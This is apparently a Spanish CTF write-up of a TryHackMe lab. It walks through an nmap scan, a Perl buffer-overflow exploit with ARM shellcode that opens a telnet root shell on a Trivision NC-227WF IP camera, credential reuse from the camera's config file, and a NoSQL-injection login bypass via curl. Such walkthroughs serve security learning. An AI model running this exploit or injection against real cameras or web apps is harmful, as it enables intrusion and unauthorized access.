# Test de conectividad

![image](https://github.com/user-attachments/assets/41016d7c-7c60-448a-87f3-f06346a300fc)

# Enumeración

```
sudo nmap -sSCV -T4 -p- --min-rate 5000 10.10.98.117
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-20 08:12 GMT
Nmap scan report for 10.10.98.117
Host is up (0.00067s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
23/tcp    open  tcpwrapped
8080/tcp  open  http       Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: TryHackMe | Access Forbidden - 403
50628/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 302 Redirect
|     Server: Webs
|     Date: Wed Dec 31 19:03:40 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     Location: http://NC-227WF-HD-720P:50628/default.asp
|     <html><head></head><body>
|     This document has moved to a new <a href="http://NC-227WF-HD-720P:50628/default.asp">location</a>.
|     Please update your documents to reflect the new location.
|     </body></html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Page not found
|     Server: Webs
|     Date: Wed Dec 31 19:03:40 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     <html><head><title>Document Error: Page not found</title></head>
|     <body><h2>Access Error: Page not found</h2>
|     when trying to obtain <b>(null)</b><br><p>Bad request type</p></body></html>
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Page not found
|     Server: Webs
|     Date: Wed Dec 31 19:03:55 1969
|     Pragma: no-cache
|     Cache-Control: no-cache
|     Content-Type: text/html
|     <html><head><title>Document Error: Page not found</title></head>
|     <body><h2>Access Error: Page not found</h2>
|_    when trying to obtain <b>(null)</b><br><p>Bad request type</p></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50628-TCP:V=7.80%I=7%D=2/20%Time=67B6E3F2%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,192,"HTTP/1\.0\x20302\x20Redirect\r\nServer:\x20Webs\r\nDate:
SF:\x20Wed\x20Dec\x2031\x2019:03:40\x201969\r\nPragma:\x20no-cache\r\nCach
SF:e-Control:\x20no-cache\r\nContent-Type:\x20text/html\r\nLocation:\x20ht
SF:tp://NC-227WF-HD-720P:50628/default\.asp\r\n\r\n<html><head></head><bod
SF:y>\r\n\t\tThis\x20document\x20has\x20moved\x20to\x20a\x20new\x20<a\x20h
SF:ref=\"http://NC-227WF-HD-720P:50628/default\.asp\">location</a>\.\r\n\t
SF:\tPlease\x20update\x20your\x20documents\x20to\x20reflect\x20the\x20new\
SF:x20location\.\r\n\t\t</body></html>\r\n\r\n")%r(HTTPOptions,154,"HTTP/1
SF:\.1\x20400\x20Page\x20not\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\x
SF:20Dec\x2031\x2019:03:40\x201969\r\nPragma:\x20no-cache\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html\r\n\r\n<html><head><title>D
SF:ocument\x20Error:\x20Page\x20not\x20found</title></head>\r\n\t\t<body><
SF:h2>Access\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\twhen\x20trying\
SF:x20to\x20obtain\x20<b>\(null\)</b><br><p>Bad\x20request\x20type</p></bo
SF:dy></html>\r\n\r\n")%r(RTSPRequest,154,"HTTP/1\.1\x20400\x20Page\x20not
SF:\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\x20Dec\x2031\x2019:03:40\x
SF:201969\r\nPragma:\x20no-cache\r\nCache-Control:\x20no-cache\r\nContent-
SF:Type:\x20text/html\r\n\r\n<html><head><title>Document\x20Error:\x20Page
SF:\x20not\x20found</title></head>\r\n\t\t<body><h2>Access\x20Error:\x20Pa
SF:ge\x20not\x20found</h2>\r\n\t\twhen\x20trying\x20to\x20obtain\x20<b>\(n
SF:ull\)</b><br><p>Bad\x20request\x20type</p></body></html>\r\n\r\n")%r(He
SF:lp,154,"HTTP/1\.1\x20400\x20Page\x20not\x20found\r\nServer:\x20Webs\r\n
SF:Date:\x20Wed\x20Dec\x2031\x2019:03:55\x201969\r\nPragma:\x20no-cache\r\
SF:nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html\r\n\r\n<html>
SF:<head><title>Document\x20Error:\x20Page\x20not\x20found</title></head>\
SF:r\n\t\t<body><h2>Access\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\tw
SF:hen\x20trying\x20to\x20obtain\x20<b>\(null\)</b><br><p>Bad\x20request\x
SF:20type</p></body></html>\r\n\r\n")%r(SSLSessionReq,154,"HTTP/1\.1\x2040
SF:0\x20Page\x20not\x20found\r\nServer:\x20Webs\r\nDate:\x20Wed\x20Dec\x20
SF:31\x2019:03:55\x201969\r\nPragma:\x20no-cache\r\nCache-Control:\x20no-c
SF:ache\r\nContent-Type:\x20text/html\r\n\r\n<html><head><title>Document\x
SF:20Error:\x20Page\x20not\x20found</title></head>\r\n\t\t<body><h2>Access
SF:\x20Error:\x20Page\x20not\x20found</h2>\r\n\t\twhen\x20trying\x20to\x20
SF:obtain\x20<b>\(null\)</b><br><p>Bad\x20request\x20type</p></body></html
SF:>\r\n\r\n");
MAC Address: 02:E1:4F:D9:E0:BB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.05 seconds
```

![image](https://github.com/user-attachments/assets/b4ca44ed-a955-41a7-93ec-b15c7493f2d2)

[https://github.com/Kenya123/Exploiting-Trivision-NC-227WF-IP-Camera](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/Snowy_ARMageddon)

# Explotación

```
#!/usr/bin/perl

$| = 1;
$libc = 0x40021000;

$shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x0b\x27\x24\x1b\x06\xa1\x08\xa2\x90\x1c\x04\xa3\xcc\x71\x54\x72\x1c\x80\x9c\x70\x16\xb4\x69\x46\x92\x1a\x18\x47\xff\xff\x0f\xeftelnetdX-l/bin/shX";
$buf = "A" x 284;
$buf .= pack("V", $libc + 0x00044684);

$req = "GET /form/liveRedirect?lang=${buf} HTTP/1.0\nHost: B${shellcode}\nUser-Agent: ARM/exploitlab\n\n";
print $req;
```

```
# cat umconfig.txt
TABLE=users

ROW=0
name=admin
password=Y3tiStarCur!ouspassword=admin
group=administrators
prot=0
disable=0
```

![image](https://github.com/user-attachments/assets/b3c9d5db-f5c0-41f8-814d-00016dfff5ce)

```
# curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.98.117:8080/ -L

<!DOCTYPE html>
<html lang="en" class="h-full bg-thm-900">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TryHackMe</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body class="h-full text-white">
  <div class="flex min-h-full flex-col justify-center py-12 sm:px-6 lg:px-8">
    <div class="sm:mx-auto sm:w-full sm:max-w-md">
      <h2 class="mt-6 text-center text-2xl font-bold leading-9 tracking-tight text-gray-100">Cyber Police</h2>
      <img class="mx-auto h-40 w-auto" src="badge.svg" alt="Cyber Police">
    </div>

    <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
      <div class="bg-thm-600 px-6 py-12 shadow-lg shadow-black/40 sm:rounded-lg sm:px-12">
        <form class="space-y-6" action="#" method="POST">
          <div>
            <label for="username" class="block text-sm font-medium leading-6 text-gray-100">Username</label>
            <div class="mt-2">
              <input id="username" name="username" type="text" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <label for="password" class="block text-sm font-medium leading-6 text-gray-100">Password</label>
            <div class="mt-2">
              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
            </div>
          </div>

          <div>
            <button type="submit" class="flex w-full justify-center rounded-md bg-green-500 px-3 py-1.5 text-sm font-semibold leading-6 uppercase text-thm-800 shadow-sm hover:bg-green-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-green-600">Sign in</button>
          </div>
        </form>

        <!-- Error message -->
              </div>

    </div>
  </div>
</body>

</html># 
```

```
curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.98.117:8080/logi
n.php -X POST -d "username=Frosteau&password[\$ne]=noraj" -L -c /tmp/cookies | g
rep -oE '<li .+>(.+)</li>'
<li class="text-sm mt-3 font-medium ml-6">yetikey2.txt</li>
<li class="text-sm mt-3 font-medium ml-6">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</li>
# 
```


